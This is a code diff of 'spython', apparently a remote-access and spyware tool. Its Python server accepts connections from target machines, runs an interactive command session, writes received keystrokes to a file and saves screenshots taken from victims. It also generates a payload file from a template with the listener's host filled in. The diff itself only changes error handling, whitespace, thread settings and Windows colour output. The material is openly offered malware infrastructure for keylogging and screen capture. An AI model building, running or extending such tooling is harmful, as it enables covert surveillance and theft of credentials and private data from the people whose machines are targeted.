@@ -4,9 +4,10 @@ import sys
 import os
 import threading
 import argparse
+import subprocess
 
 from time import sleep
-from termcolor import colored
+from termcolor import colored,cprint
 
 
 class Server:
@@ -46,15 +47,19 @@ class Server:
                      data = tgt_sock.recv(1024).decode()  	   
                      print(data)
                   except KeyboardInterrupt:
-                           exit()               
+                           sys.stderr.write("[-]Active connection terminated")
+                           exit()  
+                  except EOFError:
+                         exit()
                   except TimeoutError:
                       continue
                   except ConnectionAbortedError:
                            print("[-]Connection aborted by target machine")
-                           exit()
+                           break
                   except BrokenPipeError:
                          print("User entered \"break\" command, connection closed.\nIf you did not enter the break command then an unknown error has occured")
                          break
+                  
           threading.Thread(target=self.active_connection,kwargs={"verbose":self.__FLAG}).start()
     
     def keylog_connection(self,path:str,verbose:bool =False)->None:
@@ -65,6 +70,7 @@ class Server:
           :verbose: If true, the socket address(HOST:PORT) is printed to screen , by default it is set to true only the first time the function is called
           :return: None
         """
+        
         if verbose:
            print(f"[*]Listening on {self.ip}:{self.port}")
            print(f"[*]Keystrokes file path -> {colored(path,'green')}")
@@ -79,11 +85,12 @@ class Server:
                      keystrokes = tgt_ksock.recv(1024).decode()
                      if not keystrokes:
                         break
+                     
                      with open(path, "a") as f:
                             f.write(keystrokes)
-        print(self.__FLAG)
+        
         threading.Thread(target=self.keylog_connection,args=(path,),kwargs={"verbose":self.__FLAG}).start()
-
+       
     def screenshot_connection(self,path:str,verbose:bool = False)->None:
         """This method sets up the server with is listens for inbound connection and saves the binary data received into "path". Note that only binary data of image should be sent to this socket
 
@@ -94,17 +101,18 @@ class Server:
         if verbose:
            print(f"[*]Listening on {self.ip}:{self.port}")
            print(f"[*]Image file path -> {colored(path,'green')}")
-           
+        
         while True:
-          with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
-                s_sock.bind((self.ip,self.port))
-                s_sock.listen(2)
-                tgt_s_sock, addr = s_sock.accept()
-                print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
-                img = tgt_s_sock.recv(2**16)
-                if img:
-                   with open(path,"wb") as fp:
-                        fp.write(img)
+           with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
+                 s_sock.bind((self.ip,self.port))
+                 s_sock.listen(2)
+                 tgt_s_sock, addr = s_sock.accept()
+                 print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
+                 img = tgt_s_sock.recv(2**16)
+                 if img:
+                    with open(path,"wb") as fp:
+                         fp.write(img)
+       
     
     def set_flag(self)->None:
       """Setter method that sets private variable _FLAG to True
@@ -116,6 +124,7 @@ class Server:
            
 
 def main()->None:
+   
     __TEMPLATE_PATH = "templates/spython_tcp_template.py"
     __PAYLOAD_FILE_NAME =  "payload.py"
     __SIG_HOST = "SPYTHON_HOST"
@@ -154,7 +163,9 @@ def main()->None:
                      for i in TEMP:
                          f2.write(i)
                      TEMP=""
+                            
            break
+                 
         
         elif flag.lower() == "n":
              break
@@ -187,7 +198,7 @@ def main()->None:
     #Create and start threads
     thread1= threading.Thread(target=active_server.active_connection,kwargs={"verbose":True})
     thread2 = threading.Thread(target=keylog_server.keylog_connection,args=(KPATH,),kwargs={"verbose":True})
-    thread3 = threading.Thread(target=img_server.screenshot_connection,args=(IPATH,),kwargs={"verbose":True},daemon=True)
+    thread3 = threading.Thread(target=img_server.screenshot_connection,args=(IPATH,),kwargs={"verbose":True})
     thread1.start()
     thread2.start()
     thread3.start()
@@ -216,6 +227,14 @@ if __name__ == "__main__":
                                                           
 """
    msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
-   print(logo[:141],colored(logo[141:],"red"))
-   print(colored(msg,"red"))
+   if os.name == "posix":
+      print(logo[:141],colored(logo[141:],"red"))
+      print(colored(msg,"red"))
+   elif os.name == "nt":
+          import colorama
+          colorama.init()
+
+          print(logo[:141],colored(logo[141:],"red"))
+          print(colored(msg,"red"))
+
    main()
